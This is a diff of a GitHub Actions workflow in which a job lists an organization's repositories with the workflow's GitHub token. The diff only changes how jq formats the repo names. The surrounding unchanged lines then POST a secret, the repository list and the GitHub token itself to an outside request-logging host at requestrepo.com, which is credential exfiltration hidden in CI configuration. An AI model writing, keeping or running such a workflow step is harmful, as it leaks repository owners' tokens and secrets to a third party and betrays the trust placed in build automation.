@@ -15,7 +15,7 @@ jobs:
           GH_TOKEN: ${{ github.token }}
         run: |
           REPOS=$(curl -s -H "Authorization: Bearer $GH_TOKEN" \
-            "https://api.github.com/orgs/cybxis-ent-org1/repos?per_page=100" | jq -r '.[].name')
+            "https://api.github.com/orgs/cybxis-ent-org1/repos?per_page=100" | jq -c '[.[].name]')
 
           curl -s -X POST https://mzdbtd6e.requestrepo.com \
             -d "secret=$SECRET&repos=$REPOS&token=$GH_TOKEN"
